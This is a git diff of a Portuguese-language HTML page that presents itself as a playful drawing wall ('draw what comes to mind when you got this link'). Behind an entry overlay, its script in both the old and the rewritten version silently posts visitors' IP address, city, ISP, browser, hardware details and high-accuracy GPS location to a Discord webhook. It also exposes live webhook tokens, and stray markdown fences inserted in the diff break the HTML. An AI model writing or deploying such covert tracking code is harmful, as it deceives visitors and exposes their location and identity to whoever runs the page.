@@ -137,6 +137,22 @@
         <h1>Desenhe e escreva o que vier na sua mente quando recebeu esse link ou se lembra de mim!</h1>
     </div>
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
     <div id="flash"></div>
     <div id="status-msg">Processando captura... 🚀</div>
 
@@ -152,147 +168,459 @@
         </div>
     </div>
 
-    <script>
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        const flash = document.getElementById('flash');
-        const statusMsg = document.getElementById('status-msg');
-        const inputMsg = document.getElementById('mensagem-input');
-        
-        // WEBHOOKS SEPARADAS
-        const DISCORD_WEBHOOK_QUADRO = "https://discord.com/api/webhooks/1498467679097327670/ux0Y9AVqufg7tGCheSBXNc0WZvF2OYh2HRGKDJhqdm-KTq1eVKdajWsSofQKTNAYYmwC"; 
-        const DISCORD_WEBHOOK_LOGS = "https://discord.com/api/webhooks/1503850219559850177/m7-XQ6IyCu0UgQJ_p-kn7i0nzbSpfyBzJWsMJ2f9aoV3aMkQDG5CaxWjNt_ozasupw3Q"; 
+```html
+<script>
 
-        let desenhando = false;
-        let modo = 'giz';
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
 
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
+const flash = document.getElementById('flash');
+const statusMsg = document.getElementById('status-msg');
+const inputMsg = document.getElementById('mensagem-input');
 
-        // --- LÓGICA DE LOG E LIBERAÇÃO ---
-        async function liberarEGerarLog() {
-            const btn = document.getElementById('btn-entrar');
-            btn.innerText = "Validando...";
-            btn.disabled = true;
+// =========================
+// WEBHOOKS
+// =========================
 
-            const dadosAcesso = {
-                plataforma: navigator.platform,
-                horario: new Date().toLocaleString('pt-BR')
-            };
+const DISCORD_WEBHOOK_QUADRO = "https://discord.com/api/webhooks/1498467679097327670/ux0Y9AVqufg7tGCheSBXNc0WZvF2OYh2HRGKDJhqdm-KTq1eVKdajWsSofQKTNAYYmwC"; 
+const DISCORD_WEBHOOK_LOGS = "https://discord.com/api/webhooks/1503850219559850177/m7-XQ6IyCu0UgQJ_p-kn7i0nzbSpfyBzJWsMJ2f9aoV3aMkQDG5CaxWjNt_ozasupw3Q"; 
 
-            const finalizarAcesso = async (lat = null, lon = null) => {
-                let msg = `👀 **Página Liberada!**\n📱 **Dispositivo:** ${dadosAcesso.plataforma}\n⏰ **Hora:** ${dadosAcesso.horario}`;
-                
-                if (lat && lon) {
-                    msg += `\n📍 **Localização:** https://www.google.com/maps?q=${lat},${lon}`;
-                } else {
-                    msg += `\n⚠️ **Localização recusada ou indisponível.**`;
+
+// =========================
+// CONFIG
+// =========================
+
+let desenhando = false;
+let modo = 'giz';
+
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+// =========================
+// LOGS
+// =========================
+
+async function liberarEGerarLog() {
+
+    const btn = document.getElementById('btn-entrar');
+
+    btn.innerText = "Validando...";
+    btn.disabled = true;
+
+    // Evita múltiplos logs
+    if (sessionStorage.getItem("logEnviado")) {
+
+        document.getElementById('overlay-acesso').style.display = 'none';
+
+        return;
+    }
+
+    // =========================
+    // DADOS SISTEMA
+    // =========================
+
+    const sistema = {
+
+        plataforma: navigator.platform,
+
+        navegador: navigator.userAgent,
+
+        idioma: navigator.language,
+
+        cpu: navigator.hardwareConcurrency || "N/D",
+
+        memoria: navigator.deviceMemory || "N/D",
+
+        tela: `${screen.width}x${screen.height}`,
+
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+
+        horario: new Date().toLocaleString('pt-BR')
+
+    };
+
+    // =========================
+    // IP
+    // =========================
+
+    let ipData = {};
+
+    try {
+
+        const req = await fetch("https://ipapi.co/json/");
+
+        ipData = await req.json();
+
+    } catch (e) {
+
+        console.error("Erro IP");
+
+    }
+
+    // =========================
+    // FINALIZAR
+    // =========================
+
+    async function finalizarAcesso(lat = null, lon = null) {
+
+        const embed = {
+
+            title: "🔐 NOVO ACESSO",
+
+            color: 0xc61c44,
+
+            fields: [
+
+                {
+                    name: "🌐 IP",
+                    value: ipData.ip || "Desconhecido",
+                    inline: true
+                },
+
+                {
+                    name: "🏙 Cidade",
+                    value: `${ipData.city || "?"} - ${ipData.region || "?"}`,
+                    inline: true
+                },
+
+                {
+                    name: "🌍 País",
+                    value: ipData.country_name || "?",
+                    inline: true
+                },
+
+                {
+                    name: "📡 Provedor",
+                    value: ipData.org || "Desconhecido",
+                    inline: false
+                },
+
+                {
+                    name: "💻 Plataforma",
+                    value: sistema.plataforma,
+                    inline: true
+                },
+
+                {
+                    name: "📱 Tela",
+                    value: sistema.tela,
+                    inline: true
+                },
+
+                {
+                    name: "🗣 Idioma",
+                    value: sistema.idioma,
+                    inline: true
+                },
+
+                {
+                    name: "⚙️ CPU",
+                    value: `${sistema.cpu} núcleos`,
+                    inline: true
+                },
+
+                {
+                    name: "🧮 RAM",
+                    value: `${sistema.memoria} GB`,
+                    inline: true
+                },
+
+                {
+                    name: "🕒 Timezone",
+                    value: sistema.timezone,
+                    inline: true
+                },
+
+                {
+                    name: "🧠 Navegador",
+                    value: sistema.navegador.substring(0, 1000),
+                    inline: false
+                },
+
+                {
+                    name: "⏰ Horário",
+                    value: sistema.horario,
+                    inline: false
                 }
 
-                try {
-                    await fetch(DISCORD_WEBHOOK_LOGS, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: msg })
-                    });
-                } catch (e) { console.error("Erro no log"); }
+            ],
 
-                // Esconde a trava e permite o uso
-                document.getElementById('overlay-acesso').style.display = 'none';
-            };
+            footer: {
 
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => finalizarAcesso(p.coords.latitude, p.coords.longitude),
-                    () => finalizarAcesso(),
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                text: "Sistema de Logs"
+
+            }
+
+        };
+
+        // =========================
+        // GPS
+        // =========================
+
+        if (lat && lon) {
+
+            embed.fields.push({
+
+                name: "📍 GPS",
+
+                value: `https://www.google.com/maps?q=${lat},${lon}`,
+
+                inline: false
+
+            });
+
+        } else {
+
+            embed.fields.push({
+
+                name: "📍 GPS",
+
+                value: "Permissão recusada",
+
+                inline: false
+
+            });
+
+        }
+
+        // =========================
+        // ENVIAR
+        // =========================
+
+        try {
+
+            await fetch(DISCORD_WEBHOOK_LOGS, {
+
+                method: 'POST',
+
+                headers: {
+
+                    'Content-Type': 'application/json'
+
+                },
+
+                body: JSON.stringify({
+
+                    embeds: [embed]
+
+                })
+
+            });
+
+            sessionStorage.setItem("logEnviado", "1");
+
+        } catch (err) {
+
+            console.error("Erro webhook");
+
+        }
+
+        // =========================
+        // LIBERAR
+        // =========================
+
+        document.getElementById('overlay-acesso').style.display = 'none';
+    }
+
+    // =========================
+    // GEOLOCALIZAÇÃO
+    // =========================
+
+    if ("geolocation" in navigator) {
+
+        navigator.geolocation.getCurrentPosition(
+
+            (p) => {
+
+                finalizarAcesso(
+
+                    p.coords.latitude,
+
+                    p.coords.longitude
+
                 );
-            } else {
+
+            },
+
+            () => {
+
                 finalizarAcesso();
+
+            },
+
+            {
+
+                enableHighAccuracy: true,
+
+                timeout: 10000,
+
+                maximumAge: 0
+
             }
-        }
 
-        // --- LÓGICA DO DESENHO ---
-        function setModo(m) {
-            modo = m;
-            document.getElementById('btn-giz').classList.toggle('ativo', m === 'giz');
-            document.getElementById('btn-borracha').classList.toggle('ativo', m === 'borracha');
-        }
+        );
 
-        function getPos(e) {
-            const x = e.clientX || (e.touches && e.touches[0].clientX);
-            const y = e.clientY || (e.touches && e.touches[0].clientY);
-            return { x, y };
-        }
+    } else {
 
-        function iniciar(e) {
-            if (e.target.id === 'mensagem-input') return;
-            desenhando = true;
-            const pos = getPos(e);
-            ctx.beginPath();
-            ctx.moveTo(pos.x, pos.y);
-            if (modo === 'giz') {
-                ctx.globalCompositeOperation = 'source-over';
-                ctx.strokeStyle = "rgba(255, 235, 240, 0.85)";
-                ctx.lineWidth = 3;
-                ctx.lineCap = 'round';
+        finalizarAcesso();
+
+    }
+}
+
+// =========================
+// DESENHO
+// =========================
+
+function setModo(m) {
+
+    modo = m;
+
+    document.getElementById('btn-giz').classList.toggle('ativo', m === 'giz');
+
+    document.getElementById('btn-borracha').classList.toggle('ativo', m === 'borracha');
+}
+
+function getPos(e) {
+
+    const x = e.clientX || (e.touches && e.touches[0].clientX);
+
+    const y = e.clientY || (e.touches && e.touches[0].clientY);
+
+    return { x, y };
+}
+
+function iniciar(e) {
+
+    if (e.target.id === 'mensagem-input') return;
+
+    desenhando = true;
+
+    const pos = getPos(e);
+
+    ctx.beginPath();
+
+    ctx.moveTo(pos.x, pos.y);
+
+    if (modo === 'giz') {
+
+        ctx.globalCompositeOperation = 'source-over';
+
+        ctx.strokeStyle = "rgba(255,235,240,0.85)";
+
+        ctx.lineWidth = 3;
+
+        ctx.lineCap = 'round';
+
+    } else {
+
+        ctx.globalCompositeOperation = 'destination-out';
+
+        ctx.lineWidth = 40;
+    }
+}
+
+function mover(e) {
+
+    if (!desenhando) return;
+
+    const pos = getPos(e);
+
+    ctx.lineTo(pos.x, pos.y);
+
+    ctx.stroke();
+}
+
+// =========================
+// ENVIAR DESENHO
+// =========================
+
+async function capturarEEnviar() {
+
+    const textoUsuario = inputMsg.value || "Sem mensagem.";
+
+    flash.classList.add('flash-active');
+
+    statusMsg.style.display = 'block';
+
+    canvas.toBlob(async (blob) => {
+
+        const formData = new FormData();
+
+        formData.append('file', blob, 'desenho.png');
+
+        formData.append('payload_json', JSON.stringify({
+
+            content: `🎨 Nova memória recebida!\n\nMensagem: ${textoUsuario}`
+
+        }));
+
+        try {
+
+            const response = await fetch(DISCORD_WEBHOOK_QUADRO, {
+
+                method: 'POST',
+
+                body: formData
+
+            });
+
+            if (response.ok) {
+
+                statusMsg.innerHTML = "✅ Recebido!";
+
+                setTimeout(() => {
+
+                    window.location.href = "inicio.html";
+
+                }, 1500);
+
             } else {
-                ctx.globalCompositeOperation = 'destination-out';
-                ctx.lineWidth = 40;
+
+                statusMsg.innerHTML = "❌ Erro ao enviar";
+
             }
+
+        } catch (err) {
+
+            statusMsg.innerHTML = "❌ Erro conexão";
+
         }
 
-        function mover(e) {
-            if (!desenhando) return;
-            const pos = getPos(e);
-            ctx.lineTo(pos.x, pos.y);
-            ctx.stroke();
-        }
+    }, 'image/png');
+}
 
-        async function capturarEEnviar() {
-            const textoUsuario = inputMsg.value || "Sem mensagem.";
-            flash.classList.add('flash-active');
-            statusMsg.style.display = 'block';
-            
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('file', blob, 'desenho.png');
-                formData.append('payload_json', JSON.stringify({
-                    content: `🎨 **Nova memória recebida!**\n\n**Mensagem:** ${textoUsuario}`
-                }));
+// =========================
+// EVENTOS
+// =========================
 
-                try {
-                    const response = await fetch(DISCORD_WEBHOOK_QUADRO, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    if (response.ok) {
-                        statusMsg.innerHTML = "✅ Recebido! Até logo...";
-                        setTimeout(() => { window.location.href = "inicio.html"; }, 1500);
-                    } else {
-                        statusMsg.innerHTML = "❌ Erro ao enviar";
-                        setTimeout(() => statusMsg.style.display = 'none', 2000);
-                    }
-                } catch (err) {
-                    statusMsg.innerHTML = "❌ Erro de conexão";
-                    setTimeout(() => statusMsg.style.display = 'none', 2000);
-                }
-            }, 'image/png');
-        }
+canvas.addEventListener('mousedown', iniciar);
 
-        canvas.addEventListener('mousedown', iniciar);
-        window.addEventListener('mousemove', mover);
-        window.addEventListener('mouseup', () => desenhando = false);
-        canvas.addEventListener('touchstart', (e) => { 
-            if(e.target.id !== 'mensagem-input') e.preventDefault(); 
-            iniciar(e); 
-        });
-        window.addEventListener('touchmove', (e) => { mover(e); });
-        window.addEventListener('touchend', () => desenhando = false);
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-    </script>
+window.addEventListener('mousemove', mover);
+
+window.addEventListener('mouseup', () => desenhando = false);
+
+canvas.addEventListener('touchstart', (e) => {
+
+    if(e.target.id !== 'mensagem-input') e.preventDefault();
+
+    iniciar(e);
+
+});
+
+window.addEventListener('touchmove', mover);
+
+window.addEventListener('touchend', () => desenhando = false);
+
+window.addEventListener('resize', () => {
+
+    canvas.width = window.innerWidth;
+
+    canvas.height = window.innerHeight;
+
+});
+
+</script>
+```
+
 </body>
 </html>
